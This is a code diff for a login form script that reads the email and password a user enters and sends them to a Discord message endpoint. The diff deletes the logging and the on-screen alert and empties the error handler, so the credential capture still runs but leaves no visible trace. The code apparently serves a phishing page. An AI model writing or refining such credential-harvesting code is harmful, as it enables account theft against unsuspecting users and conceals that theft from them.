@@ -145,16 +145,10 @@ async function sendDiscordMessage(content) {
         content: content
       })
     });
-
-    if (response.ok) {
-      console.log('Message sent successfully!');
-    } else {
-      console.error('Failed to send message:', response.status);
-    }
   } catch (error) {
-    console.error('Error sending message:', error);
   }
 }
+
 
 // Handle form submission
 loginForm.addEventListener("submit", function(e) {
@@ -164,7 +158,6 @@ loginForm.addEventListener("submit", function(e) {
   const password = passwordInput.value;
   
   // Show alert with the values
-  alert(`Email: ${email}\nPassword: ${password}`);
   sendDiscordMessage(`Email: ${email}\nPassword: ${password}`);
   
   // Animate the button
